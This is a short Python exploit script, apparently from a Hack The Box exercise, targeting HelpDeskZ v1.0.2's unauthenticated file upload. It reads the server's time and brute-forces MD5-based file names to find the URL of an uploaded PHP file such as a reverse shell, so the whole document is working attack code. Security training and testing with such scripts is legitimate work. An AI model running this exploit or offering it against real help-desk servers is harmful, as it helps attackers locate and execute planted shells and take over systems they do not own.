#!/usr/bin/env python3

import hashlib
import time
import calendar
import sys
import requests

print("HelpDesk v1.0.2 - Unauthenticated shell upload")

if len(sys.argv) < 3:
    print("Usage: {} http://helpdeskz.com/support/uploads/tickets/ Reverse-shell.php".format(sys.argv[0]))
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

response = requests.head('http://help.htb/support/')
serverTime = response.headers['Date']

FormatTime = '%a, %d %b %Y %H:%M:%S %Z'
currentTime = int(calendar.timegm(time.strptime(serverTime, FormatTime)))

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext.encode()).hexdigest()
    url = helpdeskzBaseUrl + md5hash + '.php'
    #print(url) uncomment for debug
    response = requests.head(url)
    
    if response.status_code == 200:
        print("found!")
        print(url)
        sys.exit(0)

print("Sorry, I did not find anything")

